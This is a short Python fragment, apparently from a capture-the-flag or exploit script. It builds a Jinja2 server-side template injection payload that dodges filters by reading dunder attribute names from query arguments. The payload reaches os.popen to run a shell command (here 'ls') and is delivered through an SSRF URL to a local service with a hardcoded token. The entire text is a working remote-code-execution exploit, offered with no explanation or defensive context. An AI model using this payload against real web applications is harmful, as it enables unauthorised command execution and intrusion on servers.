payload = "{% set usc = request | attr('args') | attr('get')('usc') %}"
payload += "{% set init = request | attr('args') | attr('get')('init') %}"
payload += "{% set globals = request | attr('args') | attr('get')('globals') %}"
payload += "{% set builtins = request | attr('args') | attr('get')('builtins') %}"
payload += "{% set imp = request | attr('args') | attr('get')('import') %}"

payload += "{% set cmd = request | attr('args') | attr('get')('cmd') %}"
payload += "{% set d = self | attr(init) | attr(globals) %} "
payload += "{% for key, value in d | attr('items')() %} {% if key == builtins %} {% for k, v in value | attr('items')() %} {% if k == imp %} {% set g = v('os') | attr('popen')(cmd) | attr('read')() %} {% print(g) %} {% endif %} {% endfor %} {% endif %} {% endfor %}"
ssrf = self.headers.get('ssrf', f'http://0.0.0.0:3000/home?import=__import__&init=__init__&globals=__globals__&builtins=__builtins__&cmd=ls&usc=_&token=d1bc7c7e8f55977bcf8ae6bf61def48a&directory={payload}')